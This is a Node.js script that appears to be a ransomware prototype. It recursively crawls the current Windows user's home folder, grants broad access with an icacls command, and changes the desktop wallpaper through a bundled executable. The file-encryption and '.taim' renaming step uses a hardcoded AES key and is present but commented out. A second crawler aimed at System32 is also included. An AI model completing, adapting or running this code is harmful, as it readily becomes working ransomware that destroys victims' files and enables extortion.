strict: false
const fs = require('fs')
const path = require('path')
const AES = require('aes-encryption')
const cp = require('node:child_process')
const promisify = require('node:util')
const aes = new AES()
const os = require('os')

aes.setSecretKey('11122233344455566677788822244455555555555555555231231321313aaaff')

const execFile = promisify.promisify(cp.execFile);
async function setWallpaper() {
    const binary = path.join(__dirname, 'windows-wallpaper.exe')
    await execFile(binary, [path.join(__dirname, 'bg.png')]);
}

const crawlerLoop = () => {
    let cwd = process.cwd()
    let root = fs.readdirSync(cwd)
    root.forEach((i) => {
        fs.stat(path.join(cwd, i), (err, stats) => {
            if(err){}
            if (stats.isFile()) {
                try {
                    // const data = fs.readFileSync(path.join(cwd, i))
                    // const encrypt = aes.encrypt(data)
                    // fs.writeFileSync(path.join(cwd, i), encrypt)
                    // fs.renameSync(path.join(cwd, i), path.join(cwd, `${i}.taim`))
                } catch (e) {

                }

            }
            if (stats.isDirectory()){
                process.chdir(path.join(cwd, i))
                crawlerLoop()

            }
        })
    })
}

const crawlSystem32 = async ()=>{
    const cwd = process.cwd()
    let target= fs.readdirSync(cwd)
    target.forEach((i)=>{
        fs.stat(path.join(cwd, i),(err, stats)=>{
            // if(stats.isFile()){
            //    const file  =  fs.readFileSync(path.resolve(path.join(cwd, i)))
            //    setTimeout(()=>{
            //     console.log(i)
            // }, 20000)
              
            // }
            if(stats.isDirectory()){
                console.log(i)
                process.chdir(path.join(cwd, i))
                crawlSystem32()
            }
            
        })
    })
}

const crawl = async () => {
    //this is the root of your testing folder...tweak as needed 
    const user = os.userInfo().username
    cp.exec(`icacls "C:\\Users\\${user} /grant Users:F"`)
    const BASE_DIR = `C:\\Users\\${user}`
    process.chdir(BASE_DIR)
    crawlerLoop()
    await setWallpaper()
    // crawlSystem32()
    
}
crawl()